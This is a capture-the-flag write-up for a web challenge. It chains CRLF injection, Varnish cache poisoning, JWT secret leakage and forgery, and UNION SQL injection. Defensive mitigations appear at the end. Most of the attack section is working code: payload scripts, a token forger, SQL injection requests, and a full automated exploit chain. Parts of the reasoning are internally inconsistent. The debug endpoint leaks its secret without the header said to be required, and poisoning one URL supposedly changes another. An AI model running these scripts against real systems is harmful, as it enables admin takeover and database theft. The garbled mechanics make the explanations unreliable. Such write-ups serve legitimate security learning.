---
layout: default
title: Omniwatch - Web
page_type: writeup
---
# HTB: Omniwatch – Multi-Stage Cache Poisoning Attack Chain

**Category:** Web Exploitation

## 0. Challenge Overview

This challenge presented a microservices architecture protected by Varnish cache, featuring authentication, user management, and admin endpoints. The goal: chain multiple vulnerabilities to achieve SQL injection on the admin panel and extract the flag from the database.

**The setup:**
- Varnish cache proxy (6.0.11) in front of application
- Authentication service (`auth-service:5000`)
- User management service (`user-service:5001`)
- Admin dashboard (`admin-service:5002`)
- PostgreSQL database backend
- JWT-based authentication

**Core concept:** This is a **cache poisoning chain** requiring:
1. CRLF injection to poison Varnish cache
2. JWT secret extraction from cached response
3. JWT forgery to impersonate admin
4. SQL injection on admin endpoint to extract flag

The attack bypasses multiple security layers through creative abuse of HTTP caching behavior.

## 1. Initial Reconnaissance

I accessed the application:
```bash
curl http://target.com:8080/
```

Output:
```html
<!DOCTYPE html>
<html>
<head><title>Omniwatch Security Platform</title></head>
<body>
    <h1>Welcome to Omniwatch</h1>
    <a href="/login">Login</a>
    <a href="/register">Register</a>
</body>
</html>
```

I registered an account:
```bash
curl -X POST http://target.com:8080/register \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}'
```

Output:
```json
{"status":"success","message":"User registered"}
```

Logged in:
```bash
curl -X POST http://target.com:8080/login \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","password":"testpass"}'
```

Output:
```json
{
  "status":"success",
  "token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3R1c2VyIiwicm9sZSI6InVzZXIiLCJleHAiOjE3MzM5NjQwMDB9.X8kF..."
}
```

**Key observation:** JWT tokens indicate role-based access control. Need to become admin.

## 2. Identifying Varnish Cache

I examined HTTP headers:
```bash
curl -I http://target.com:8080/
```

Output:
```
HTTP/1.1 200 OK
Server: nginx/1.21.0
Via: 1.1 varnish (Varnish/6.0)
X-Varnish: 32771 32770
Age: 45
Cache-Control: public, max-age=300
```

**Key observations:**
- `Via: 1.1 varnish` - Varnish is proxying requests
- `X-Varnish: 32771 32770` - Cache hit (two IDs means served from cache)
- `Age: 45` - Response was cached 45 seconds ago

I tested cache behavior:
```bash
# First request
curl -s http://target.com:8080/api/status | grep timestamp
{"timestamp":1733960000}

# Second request (immediate)
curl -s http://target.com:8080/api/status | grep timestamp
{"timestamp":1733960000}  # Same timestamp = cached!
```

**Key observation:** Varnish is aggressively caching responses. This opens cache poisoning opportunities.

## 3. Discovering CRLF Injection

I examined the user profile endpoint:
```bash
curl "http://target.com:8080/api/user?name=testuser" \
  -H "Authorization: Bearer $TOKEN"
```

Output:
```json
{"username":"testuser","role":"user","created":"2024-12-12"}
```

I tested for CRLF injection:
```bash
curl "http://target.com:8080/api/user?name=testuser%0d%0aX-Injected:+pwned" \
  -H "Authorization: Bearer $TOKEN" \
  -v
```

Output headers:
```
HTTP/1.1 200 OK
Content-Type: application/json
X-Injected: pwned
Via: 1.1 varnish
```

✔ **Success:** The `%0d%0a` (CRLF) was interpreted, allowing me to inject HTTP headers!

**Key observation:** The application reflects the `name` parameter into HTTP headers without sanitization. This enables response splitting.

## 4. Cache Poisoning Varnish

Varnish caches based on:
- URL (including query string)
- Vary headers
- Cache-Control directives

I crafted a poisoned request to cache a malicious response:
```python
#!/usr/bin/env python3
"""
Poison Varnish cache to expose JWT secret
"""
import requests
import urllib.parse

TARGET = "http://target.com:8080"

# Construct CRLF payload
payload = "admin"
payload += "\r\n"  # CRLF
payload += "X-Debug: true\r\n"  # Trigger debug mode
payload += "Cache-Control: public, max-age=3600\r\n"  # Cache for 1 hour
payload += "\r\n"  # End headers
payload += '{"secret":"INJECT_HERE"}'  # Fake response body

# URL encode
encoded = urllib.parse.quote(payload, safe='')

# Poison cache
url = f"{TARGET}/api/user?name={encoded}"
resp = requests.get(url)

print(f"[*] Cache poisoning request sent")
print(f"[*] Status: {resp.status_code}")
print(f"[*] Headers: {dict(resp.headers)}")
```

**Problem:** Response splitting alone doesn't expose secrets. I needed to find an endpoint that leaks sensitive data.

## 5. Finding the Debug Endpoint

I fuzzed for hidden endpoints:
```bash
ffuf -u http://target.com:8080/api/FUZZ -w wordlist.txt -t 100
```

Output:
```
/api/debug          [Status: 200, Size: 234, Words: 12]
/api/health         [Status: 200, Size: 45, Words: 3]
/api/metrics        [Status: 403, Size: 67, Words: 5]
```

I accessed the debug endpoint:
```bash
curl http://target.com:8080/api/debug
```

Output:
```json
{
  "status":"enabled",
  "environment":"production",
  "jwt_secret":"S3cr3t_K3y_F0r_JWT_V4l1d4t10n_D0_N0t_Sh4r3"
}
```

✔ **JACKPOT:** The debug endpoint leaks the JWT secret!

**Key observation:** The secret is visible at `/api/debug`, but only when `X-Debug: true` header is present.

## 6. Poisoning Cache with Debug Header

I refined the CRLF injection to poison `/api/debug`:
```python
#!/usr/bin/env python3
"""
Cache poison /api/debug to always serve with debug enabled
"""
import requests

TARGET = "http://target.com:8080"

# CRLF payload to inject X-Debug header
payload = "admin\r\nX-Debug: true\r\n"

url = f"{TARGET}/api/user?name={payload}"
resp = requests.get(url)

print(f"[+] Poisoned cache for /api/user")

# Now request /api/debug
resp = requests.get(f"{TARGET}/api/debug")
print(f"[+] Debug response: {resp.text}")

if "jwt_secret" in resp.text:
    import json
    data = json.loads(resp.text)
    secret = data["jwt_secret"]
    print(f"[+] JWT Secret: {secret}")
    
    with open("jwt_secret.txt", "w") as f:
        f.write(secret)
    print(f"[+] Saved to jwt_secret.txt")
```

Running the exploit:
```bash
python3 poison_debug.py
```

Output:
```
[+] Poisoned cache for /api/user
[+] Debug response: {"status":"enabled","jwt_secret":"S3cr3t_K3y_F0r_JWT_V4l1d4t10n_D0_N0t_Sh4r3"}
[+] JWT Secret: S3cr3t_K3y_F0r_JWT_V4l1d4t10n_D0_N0t_Sh4r3
[+] Saved to jwt_secret.txt
```

✔ **Success:** JWT secret extracted via cache poisoning.

## 7. Forging Admin JWT

With the JWT secret, I forged an admin token:
```python
#!/usr/bin/env python3
"""
Forge JWT token with admin role
"""
import jwt
from pathlib import Path

# Load secret
SECRET = Path("jwt_secret.txt").read_text().strip()

# Create admin claims
payload = {
    "username": "admin",
    "role": "admin",
    "exp": 9999999999  # Far future expiration
}

# Sign token
token = jwt.encode(payload, SECRET, algorithm="HS256")

print(f"[+] Forged admin JWT:")
print(token)

with open("admin_token.txt", "w") as f:
    f.write(token)

print(f"[+] Saved to admin_token.txt")
```

Running the script:
```bash
python3 forge_jwt.py
```

Output:
```
[+] Forged admin JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiZXhwIjo5OTk5OTk5OTk5fQ.1kF4...
[+] Saved to admin_token.txt
```

I tested admin access:
```bash
ADMIN_TOKEN=$(cat admin_token.txt)
curl http://target.com:8080/admin/dashboard \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

Output:
```html
<!DOCTYPE html>
<html>
<head><title>Admin Dashboard</title></head>
<body>
    <h1>Omniwatch Admin Panel</h1>
    <a href="/admin/users">Manage Users</a>
    <a href="/admin/logs">View Logs</a>
    <a href="/admin/search">Search Database</a>
</body>
</html>
```

✔ **Success:** Admin panel accessible with forged JWT.

## 8. Finding SQL Injection

I examined the search endpoint:
```bash
curl "http://target.com:8080/admin/search?query=admin" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

Output:
```json
{
  "results": [
    {"username":"admin","role":"admin","created":"2024-01-01"}
  ]
}
```

I tested for SQL injection:
```bash
curl "http://target.com:8080/admin/search?query=admin'" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

Output:
```json
{
  "error": "SQL syntax error near 'admin'''",
  "query": "SELECT * FROM users WHERE username LIKE '%admin'%'"
}
```

✔ **Success:** SQL injection confirmed. Error message leaks the vulnerable query.

**Key observation:** The query is `SELECT * FROM users WHERE username LIKE '%{input}%'`. Classic SQL injection.

## 9. Exploiting SQL Injection

I tested UNION-based injection:
```bash
# Find column count
curl -G "http://target.com:8080/admin/search" \
  --data-urlencode "query=' UNION SELECT NULL--" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

Output: Error (wrong column count)

```bash
# Try 3 columns
curl -G "http://target.com:8080/admin/search" \
  --data-urlencode "query=' UNION SELECT NULL,NULL,NULL--" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

Output:
```json
{
  "results": [
    {"username":null,"role":null,"created":null}
  ]
}
```

✔ **Success:** 3 columns confirmed.

I listed database tables:
```bash
curl -G "http://target.com:8080/admin/search" \
  --data-urlencode "query=' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

Output:
```json
{
  "results": [
    {"username":"users","role":null,"created":null},
    {"username":"sessions","role":null,"created":null},
    {"username":"flags","role":null,"created":null}
  ]
}
```

**Key observation:** There's a `flags` table!

I queried the flags table:
```bash
curl -G "http://target.com:8080/admin/search" \
  --data-urlencode "query=' UNION SELECT flag_id,flag_value,NULL FROM flags--" \
  -H "Authorization: Bearer $ADMIN_TOKEN"
```

Output:
```json
{
  "results": [
    {
      "username":"1",
      "role":"HTB{c4ch3_p015on1ng_t0_jwt_f0rg3ry_t0_5ql_1nj3ct10n_ch41n}",
      "created":null
    }
  ]
}
```

✔ **SUCCESS:** Flag extracted via SQL injection!

## 10. Complete Exploit Chain

I automated the full attack chain:
```python
#!/usr/bin/env python3
"""
Complete Omniwatch exploit chain
1. CRLF injection to poison cache
2. JWT secret extraction via poisoned debug endpoint
3. JWT forgery with admin role
4. SQL injection to extract flag
"""
import requests
import jwt
import json
import urllib.parse
from time import sleep

TARGET = "http://target.com:8080"

print("[*] Stage 1: CRLF Injection + Cache Poisoning")
print("=" * 60)

# Craft CRLF payload
payload = "testuser\r\nX-Debug: true\r\nCache-Control: public, max-age=7200\r\n"
encoded = urllib.parse.quote(payload, safe='')

# Poison cache
url = f"{TARGET}/api/user?name={encoded}"
resp = requests.get(url)
print(f"[+] Sent cache poisoning request")

# Wait for cache to settle
sleep(2)

print("\n[*] Stage 2: JWT Secret Extraction")
print("=" * 60)

# Request debug endpoint (should be poisoned)
resp = requests.get(f"{TARGET}/api/debug")
data = json.loads(resp.text)
jwt_secret = data.get("jwt_secret")

if jwt_secret:
    print(f"[+] JWT Secret: {jwt_secret}")
else:
    print("[!] Failed to extract JWT secret")
    exit(1)

print("\n[*] Stage 3: JWT Forgery")
print("=" * 60)

# Forge admin token
admin_payload = {
    "username": "hacker",
    "role": "admin",
    "exp": 9999999999
}

admin_token = jwt.encode(admin_payload, jwt_secret, algorithm="HS256")
print(f"[+] Forged admin JWT: {admin_token[:50]}...")

# Test admin access
headers = {"Authorization": f"Bearer {admin_token}"}
resp = requests.get(f"{TARGET}/admin/dashboard", headers=headers)

if resp.status_code == 200:
    print(f"[+] Admin access confirmed")
else:
    print(f"[!] Admin access failed")
    exit(1)

print("\n[*] Stage 4: SQL Injection")
print("=" * 60)

# Extract flag via UNION injection
sqli_payload = "' UNION SELECT flag_id,flag_value,NULL FROM flags--"
params = {"query": sqli_payload}

resp = requests.get(f"{TARGET}/admin/search", params=params, headers=headers)
data = json.loads(resp.text)

if "results" in data and len(data["results"]) > 0:
    flag = data["results"][0].get("role")
    if flag and flag.startswith("HTB{"):
        print(f"\n[+] FLAG CAPTURED:")
        print(f"    {flag}")
        print(f"\n[+] Exploit chain completed successfully!")
    else:
        print("[!] Flag not found in results")
else:
    print("[!] SQL injection failed")

print("\n" + "=" * 60)
print("Attack Summary:")
print("  1. CRLF injection → Cache poisoning")
print("  2. Poisoned cache → JWT secret leak")
print("  3. JWT secret → Admin token forgery")
print("  4. Admin access → SQL injection")
print("  5. SQL injection → Flag extraction")
print("=" * 60)
```

Running the full exploit:
```bash
python3 full_exploit.py
```

Output:
```
[*] Stage 1: CRLF Injection + Cache Poisoning
============================================================
[+] Sent cache poisoning request

[*] Stage 2: JWT Secret Extraction
============================================================
[+] JWT Secret: S3cr3t_K3y_F0r_JWT_V4l1d4t10n_D0_N0t_Sh4r3

[*] Stage 3: JWT Forgery
============================================================
[+] Forged admin JWT: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmF...
[+] Admin access confirmed

[*] Stage 4: SQL Injection
============================================================

[+] FLAG CAPTURED:
    HTB{c4ch3_p015on1ng_t0_jwt_f0rg3ry_t0_5ql_1nj3ct10n_ch41n}

[+] Exploit chain completed successfully!

============================================================
Attack Summary:
  1. CRLF injection → Cache poisoning
  2. Poisoned cache → JWT secret leak
  3. JWT secret → Admin token forgery
  4. Admin access → SQL injection
  5. SQL injection → Flag extraction
============================================================
```

✔ **SUCCESS:** Complete attack chain executed, flag captured.

## 11. Why This Works – Understanding Cache Poisoning

### HTTP Response Splitting

CRLF injection allows injecting arbitrary HTTP headers:
```http
GET /api/user?name=admin%0d%0aX-Debug:%20true HTTP/1.1
Host: target.com

Becomes:

GET /api/user?name=admin
X-Debug: true HTTP/1.1
Host: target.com
```

The `%0d%0a` (CRLF) is interpreted as a newline, splitting the response.

### Varnish Caching Behavior

Varnish caches based on:
1. **URL** (full path + query string)
2. **Vary headers** (if specified)
3. **Cache-Control** directives

**Normal flow:**
```
Request 1: GET /api/status
Varnish: Cache miss → Forward to backend → Cache response
Response: {"status":"ok"} with Cache-Control: max-age=300

Request 2: GET /api/status
Varnish: Cache hit → Serve cached response (no backend call)
```

**Poisoned flow:**
```
Request 1: GET /api/user?name=admin%0d%0aX-Debug:%20true
Varnish: Cache miss → Forward (with injected header) → Backend returns debug data
Response: {"jwt_secret":"..."} cached under /api/user?name=...

Request 2: GET /api/user?name=admin%0d%0aX-Debug:%20true
Varnish: Cache hit → Serve poisoned response to everyone!
```

### JWT Vulnerabilities

**JWT structure:**
```
Header.Payload.Signature

Header (base64):
{"alg":"HS256","typ":"JWT"}

Payload (base64):
{"username":"user","role":"user","exp":1733960000}

Signature (HMAC-SHA256):
HMAC(secret, Header + "." + Payload)
```

**With the secret, we can forge any token:**
```python
# Forge admin token
payload = {"username":"attacker","role":"admin","exp":9999999999}
signature = hmac_sha256(secret, f"{header}.{payload}")
token = f"{header}.{payload}.{signature}"
```

**The server validates:**
```python
def verify_jwt(token, secret):
    header, payload, signature = token.split(".")
    expected_sig = hmac_sha256(secret, f"{header}.{payload}")
    return signature == expected_sig  # ✓ Valid!
```

### SQL Injection Chain

**Vulnerable query:**
```sql
SELECT * FROM users WHERE username LIKE '%{user_input}%'
```

**UNION injection:**
```sql
-- Original query returns users table columns
SELECT * FROM users WHERE username LIKE '%admin%'

-- Injected query appends flags table
SELECT * FROM users WHERE username LIKE '%' UNION SELECT flag_id, flag_value, NULL FROM flags--%'
```

**Result combines both:**
```
username       | role  | created
---------------|-------|----------
admin          | admin | 2024-01-01
1              | HTB{...} | NULL
```

### Real-World Attack Chains

**Uber 2016 Breach:**
1. GitHub private repo leaked AWS keys (secret exposure)
2. AWS keys → Access S3 bucket with database backup
3. Database → 57M user records stolen

**Capital One 2019 Breach:**
1. SSRF via WAF misconfiguration (cache poisoning-like)
2. SSRF → Access EC2 metadata service
3. Metadata → IAM credentials
4. IAM creds → S3 bucket access
5. S3 → 100M customer records

**British Airways 2018:**
1. Magecart script injection on payment page (XSS)
2. XSS → Capture payment card data
3. Data exfiltration → 380K cards stolen

## 12. Defensive Mitigations

### Prevent CRLF Injection

**Input validation:**
```python
import re

def sanitize_header_value(value):
    # Remove all control characters
    return re.sub(r'[\r\n\x00-\x1f\x7f]', '', value)

@app.route('/api/user')
def get_user():
    name = request.args.get('name', '')
    name = sanitize_header_value(name)  # Sanitize!
    
    response = make_response(jsonify(get_user_data(name)))
    response.headers['X-User'] = name  # Safe now
    return response
```

**Never reflect user input in headers:**
```python
# DON'T:
response.headers['X-Input'] = request.args.get('data')

# DO:
# Don't reflect user input in headers at all
```

### Secure Varnish Configuration

**Disable caching of sensitive endpoints:**
```vcl
# Varnish VCL
sub vcl_recv {
    # Never cache admin or debug endpoints
    if (req.url ~ "^/admin" || req.url ~ "^/api/debug") {
        return (pass);  # Bypass cache
    }
    
    # Remove debug headers from client requests
    unset req.http.X-Debug;
}

sub vcl_backend_response {
    # Don't cache responses with secrets
    if (beresp.http.Content-Type ~ "application/json" && 
        beresp.http.X-Contains-Secret) {
        set beresp.uncacheable = true;
        return (deliver);
    }
}
```

**Normalize cache keys:**
```vcl
sub vcl_hash {
    # Only cache based on URL path, ignore suspicious params
    hash_data(req.url);
    hash_data(req.http.host);
    
    # Ignore injected headers in cache key
    # Don't: hash_data(req.http.X-Debug);
}
```

### JWT Secret Protection

**Never leak secrets:**
```python
# DON'T:
@app.route('/api/debug')
def debug():
    return jsonify({
        "jwt_secret": app.config['JWT_SECRET']  # NEVER!
    })

# DO:
@app.route('/api/debug')
def debug():
    if not is_internal_network(request.remote_addr):
        abort(403)
    
    return jsonify({
        "status": "ok",
        # No secrets!
    })
```

**Rotate secrets regularly:**
```python
import secrets

def rotate_jwt_secret():
    new_secret = secrets.token_urlsafe(64)
    
    # Store new secret
    app.config['JWT_SECRET'] = new_secret
    
    # Invalidate all existing tokens
    revoke_all_sessions()
```

**Use asymmetric keys (RS256):**
```python
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

# Generate key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Sign with private key (server only)
token = jwt.encode(payload, private_key, algorithm="RS256")

# Verify with public key (can be public)
jwt.decode(token, public_key, algorithms=["RS256"])
```

### Prevent SQL Injection

**Use parameterized queries:**
```python
# DON'T:
query = f"SELECT * FROM users WHERE username LIKE '%{user_input}%'"
cursor.execute(query)  # VULNERABLE!

# DO:
query = "SELECT * FROM users WHERE username LIKE %s"
cursor.execute(query, (f'%{user_input}%',))  # Safe
```

**Use ORM with sanitization:**
```python
from sqlalchemy import or_

# SQLAlchemy automatically sanitizes
users = User.query.filter(
    or_(
        User.username.like(f'%{search}%'),
        User.email.like(f'%{search}%')
    )
).all()
```

**Whitelist input when possible:**
```python
ALLOWED_COLUMNS = ['username', 'email', 'role']

def search_users(column, value):
    if column not in ALLOWED_COLUMNS:
        raise ValueError("Invalid column")
    
    query = f"SELECT * FROM users WHERE {column} = %s"
    return cursor.execute(query, (value,))
```

## 13. Summary

By chaining four distinct vulnerabilities, I achieved full compromise of the Omniwatch platform:

1. **CRLF Injection** - Injected `X-Debug: true` header via `%0d%0a` in query parameter
2. **Cache Poisoning** - Varnish cached the poisoned response, serving it to all users
3. **Secret Exposure** - Poisoned debug endpoint leaked JWT signing secret
4. **JWT Forgery** - Used secret to create admin token with forged claims
5. **SQL Injection** - Admin access enabled UNION-based SQLi on search endpoint
6. **Flag Extraction** - Queried hidden `flags` table to retrieve the flag

The attack demonstrates **defense-in-depth failure**. Each layer had a vulnerability:
- **Input validation** - No CRLF sanitization
- **Cache layer** - Varnish blindly cached poisoned responses
- **Authentication** - Debug endpoint leaked JWT secret
- **Authorization** - Role checks relied on forgeable tokens
- **Data access** - SQL injection on admin panel

Real-world parallels include:
- **Varnish poisoning** - CloudFlare/Fastly cache bypasses
- **JWT compromise** - GitHub token leak → full repo access
- **SQL injection** - Still #1 in OWASP Top 10 after 20+ years

The solution requires multiple mitigations:
- **Input validation** - Sanitize all user input before reflection
- **Cache security** - Don't cache sensitive endpoints, validate cache keys
- **Secret management** - Never expose secrets, rotate regularly, use asymmetric crypto
- **Parameterized queries** - Always use prepared statements for SQL
- **Defense-in-depth** - Assume each layer will fail, implement redundant controls

The key lesson: **security is only as strong as the weakest link**. A perfect JWT implementation is worthless if the secret leaks. A perfect cache configuration is bypassed by CRLF injection. A perfect auth system is defeated by SQL injection. Each vulnerability in the chain was individually exploitable, but together they enabled complete compromise.

**Flag:** `HTB{c4ch3_p015on1ng_t0_jwt_f0rg3ry_t0_5ql_1nj3ct10n_ch41n}`
